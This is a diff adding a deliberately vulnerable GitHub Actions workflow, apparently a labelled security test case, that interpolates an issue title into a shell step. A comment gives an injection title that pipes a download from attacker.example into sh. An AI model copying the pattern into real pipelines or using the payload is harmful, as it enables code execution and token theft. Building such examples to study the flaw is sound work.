@@ -1,0 +1,21 @@
+# INTENTIONALLY VULNERABLE CI example (GT-PIPELINE-002). Never copy into .github/workflows: it would run.
+# Template injection: the issue title is pasted into a shell script, so a title such as
+# `"; curl https://attacker.example/x | sh; "` runs commands with the job's token.
+name: triage
+
+on:
+  issues:
+    types: [opened]
+
+permissions:
+  issues: write
+
+jobs:
+  label:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "New issue: ${{ github.event.issue.title }}"
+          gh issue edit "${{ github.event.issue.number }}" --add-label triage
+        env:
+          GH_TOKEN: ${{ github.token }}
